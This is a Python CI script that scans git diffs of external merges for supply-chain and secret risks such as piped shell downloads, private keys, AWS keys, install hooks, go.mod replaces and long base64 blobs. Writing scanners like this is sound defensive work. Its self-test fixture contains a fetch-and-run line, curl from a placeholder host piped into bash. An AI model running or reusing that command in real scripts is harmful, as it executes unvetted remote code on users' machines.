#!/usr/bin/env python3
"""Scan a unified diff for external-merge risk.

Reads a git unified diff on stdin. Exits 1 when an added line matches a
supply-chain or secret pattern. The scanner file is skipped so its own
pattern text is not a finding.

This is a gate, not a verdict. SECURITY-EXTERNAL-MERGES.md still requires
a human APPROVE / REQUEST CHANGES / BLOCK on external merges.
"""

from __future__ import annotations

import re
import sys

SKIP_PATHS = {
    ".github/scripts/external-merge-scan.py",
}

# Patterns are built so this source file does not contain a literal
# pipe-to-shell sample. Findings are names and impacts, not procedures.
PIPE = re.compile(
    r"\b(?:curl|wget)\b[^|\n]{0,120}\|\s*(?:ba)?sh\b|\binvoke-expression\b|\biex\s*\(",
    re.IGNORECASE,
)
PRIVATE_KEY = re.compile(r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----")
AWS_KEY = re.compile(r"\bAKIA[0-9A-Z]{16}\b")
PR_TARGET = re.compile(r"pull_request_target")
HOOK = re.compile(r"[\"'](?:postinstall|prepare)[\"']\s*:", re.IGNORECASE)
GO_REPLACE = re.compile(r"^\s*replace\s+\S+", re.IGNORECASE)
OBFUSCATED = re.compile(r"(?:[A-Za-z0-9+/]{240,}={0,2})")

RULES = (
    ("piped-download", PIPE),
    ("private-key", PRIVATE_KEY),
    ("aws-access-key", AWS_KEY),
    ("pull-request-target", PR_TARGET),
    ("install-hook", HOOK),
    ("go-replace", GO_REPLACE),
    ("long-base64", OBFUSCATED),
)


def scan(diff: str) -> list[str]:
    findings: list[str] = []
    path = ""
    new_line = 0
    for raw in diff.splitlines():
        if raw.startswith("+++ "):
            path = raw[4:]
            if path.startswith("b/"):
                path = path[2:]
            if path == "/dev/null":
                path = ""
            continue
        if raw.startswith("@@"):
            # @@ -old +new,count @@
            match = re.search(r"\+(\d+)", raw)
            new_line = int(match.group(1)) if match else 0
            continue
        if raw.startswith("---") or raw.startswith("diff "):
            continue
        if not raw.startswith("+"):
            if raw.startswith("-"):
                continue
            if path:
                new_line += 1
            continue
        line = raw[1:]
        if path in SKIP_PATHS:
            new_line += 1
            continue
        for name, rule in RULES:
            if name == "install-hook" and not path.endswith("package.json"):
                continue
            if name == "go-replace" and not path.endswith("go.mod"):
                continue
            if rule.search(line):
                findings.append(f"{path}:{new_line}: {name}")
        new_line += 1
    return findings


def self_test() -> int:
    bad = "\n".join(
        [
            "diff --git a/install.sh b/install.sh",
            "+++ b/install.sh",
            "@@ -0,0 +1,2 @@",
            "+echo start",
            "+curl https://example.invalid/x | bash",
            "diff --git a/go.mod b/go.mod",
            "+++ b/go.mod",
            "@@ -1 +1,2 @@",
            " module example",
            "+replace example.com/mod => ./vendor/mod",
        ]
    )
    good = "\n".join(
        [
            "diff --git a/README.md b/README.md",
            "+++ b/README.md",
            "@@ -1 +1,2 @@",
            " # title",
            "+Prefer a pinned installer. Do not pipe a download into a shell.",
        ]
    )
    bad_findings = scan(bad)
    good_findings = scan(good)
    ok = any("piped-download" in item for item in bad_findings) and any(
        "go-replace" in item for item in bad_findings
    )
    ok = ok and not good_findings
    if not ok:
        print("SELF-TEST FAILED")
        print("bad", bad_findings)
        print("good", good_findings)
        return 1
    print("SELF-TEST PASS")
    return 0


def main() -> int:
    if "--self-test" in sys.argv[1:]:
        return self_test()
    diff = sys.stdin.read()
    if not diff.strip():
        print("external-merge-scan: empty diff")
        return 0
    findings = scan(diff)
    if not findings:
        print("external-merge-scan: no findings")
        return 0
    print("external-merge-scan: findings")
    for item in findings:
        print(item)
    print("See SECURITY-EXTERNAL-MERGES.md. Do not merge an external change on this result alone.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
